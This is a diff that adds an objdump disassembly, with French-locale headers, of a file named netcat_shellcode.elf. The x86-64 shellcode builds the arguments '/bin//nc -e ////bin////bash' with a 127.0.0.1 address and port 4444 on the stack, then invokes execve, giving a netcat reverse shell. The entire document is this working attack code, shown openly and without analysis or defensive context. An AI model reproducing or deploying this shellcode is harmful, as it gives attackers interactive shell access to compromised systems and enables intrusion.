@@ -1,0 +1,48 @@
+
+netcat_shellcode.elf:     format de fichier elf64-x86-64
+
+
+Déassemblage de la section .text :
+
+0000000000401000 <.text>:
+  401000:	48 31 c0             	xor    rax,rax
+  401003:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x636e2f2f6e69622f
+  40100a:	2f 6e 63 
+  40100d:	50                   	push   rax
+  40100e:	53                   	push   rbx
+  40100f:	48 89 e7             	mov    rdi,rsp
+  401012:	50                   	push   rax
+  401013:	57                   	push   rdi
+  401014:	48 89 e3             	mov    rbx,rsp
+  401017:	50                   	push   rax
+  401018:	66 68 2d 65          	pushw  0x652d
+  40101c:	48 89 e1             	mov    rcx,rsp
+  40101f:	50                   	push   rax
+  401020:	48 ba 2f 2f 2f 2f 62 	movabs rdx,0x687361622f2f2f2f
+  401027:	61 73 68 
+  40102a:	52                   	push   rdx
+  40102b:	48 ba 2f 62 69 6e 2f 	movabs rdx,0x2f2f2f2f6e69622f
+  401032:	2f 2f 2f 
+  401035:	52                   	push   rdx
+  401036:	48 89 e2             	mov    rdx,rsp
+  401039:	50                   	push   rax
+  40103a:	49 b9 31 32 37 2e 30 	movabs r9,0x303030302e373231
+  401041:	30 30 30 
+  401044:	49 b8 2e 30 30 30 30 	movabs r8,0x312e30303030302e
+  40104b:	30 2e 31 
+  40104e:	41 50                	push   r8
+  401050:	41 51                	push   r9
+  401052:	49 89 e0             	mov    r8,rsp
+  401055:	50                   	push   rax
+  401056:	68 34 34 34 34       	push   0x34343434
+  40105b:	49 89 e1             	mov    r9,rsp
+  40105e:	50                   	push   rax
+  40105f:	41 51                	push   r9
+  401061:	41 50                	push   r8
+  401063:	52                   	push   rdx
+  401064:	51                   	push   rcx
+  401065:	53                   	push   rbx
+  401066:	48 89 e6             	mov    rsi,rsp
+  401069:	48 31 d2             	xor    rdx,rdx
+  40106c:	b0 3b                	mov    al,0x3b
+  40106e:	0f 05                	syscall 
